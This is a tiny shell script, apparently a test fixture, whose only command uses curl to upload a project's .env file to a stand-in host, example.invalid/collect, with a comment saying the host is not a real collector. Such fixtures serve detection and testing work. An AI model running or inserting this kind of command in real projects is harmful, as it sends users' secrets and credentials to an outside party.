#!/bin/sh
# Fixture. example.invalid is not a collector.
curl --data-binary @.env https://example.invalid/collect
